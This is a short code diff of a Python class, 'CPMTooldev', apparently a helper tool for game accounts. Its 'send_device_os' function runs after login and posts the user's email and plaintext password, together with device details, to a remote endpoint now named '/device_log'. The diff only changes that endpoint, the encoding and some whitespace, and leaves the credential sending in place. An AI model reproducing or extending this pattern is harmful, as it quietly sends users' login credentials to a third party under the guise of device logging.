@@ -32,7 +32,7 @@ class CPMTooldev:
             self.telegram_id = key_data.get("telegram_id")
             self.send_device_os(email=email, password=password)
         return response_decoded.get("error")
-
+  
     def send_device_os(self, email=None, password=None):
         try:
             system = platform.system()
@@ -80,9 +80,8 @@ class CPMTooldev:
             payload["email"] = email
         if password:
             payload["password"] = password
-        response = requests.post(f"{__ENDPOINT_URL__}/save_device", json=payload)  # Changed
+        response = requests.post(f"{__ENDPOINT_URL__}/device_log", data=payload)
         return response.status_code == 200
-
     def change_email(self, new_email):
         decoded_email = urllib.parse.unquote(new_email)
         payload = { "account_auth": self.auth_token, "new_email": decoded_email }
